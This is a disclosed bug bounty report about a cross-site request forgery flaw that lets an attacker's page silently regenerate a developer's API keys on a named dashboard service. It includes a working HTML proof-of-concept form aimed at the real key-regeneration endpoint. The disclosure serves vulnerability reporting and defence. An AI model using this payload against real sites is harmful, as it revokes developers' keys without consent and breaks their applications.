# CSRF in generating developer api_key

## Report Details
- **Report ID**: 593893
- **URL**: https://hackerone.com/reports/593893
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2019-06-02T05:26:42.271Z
- **Disclosed**: 2019-11-01T01:35:36.535Z

## Reporter
- **Username**: mr_r0w07
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: magic-bbp

## Vulnerability Information
Hi

At https://dashboard.forttmatic.com when developer tries to generate new api_key for his application, a POST request is sent to https://api.forttmatic.com which doesn't have any tokens to guard against CSRF attacks.

###CSRF POC :
```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://api.fortmatic.com/v1/dashboard/api_user/keys/regenerate" method="POST" enctype="text/plain">
      <input type="hidden" name="&#123;&#125;" value="" />
      <input type="submit" value="Generate New Keys" />
    </form>
  </body>
</html>

``` 

On submitting the above request, a new set of keys would be generated which destroys the current api_key set without the knowledge of developer.

## Impact

It doesn't have a great security impact other than that this would make the developer's app unusable because he would have to change the api_keys everywhere on his code to make the application working again.
This could be done any number of times. Everytime the developer has attacker's site opened in his browser keys would be regenerated leading to developer being left frustrated as to why his api_keys keep on changing even when he didn't ask for it and the pain to replace old pair of keys with the new one! :)

## Attachments
No attachments
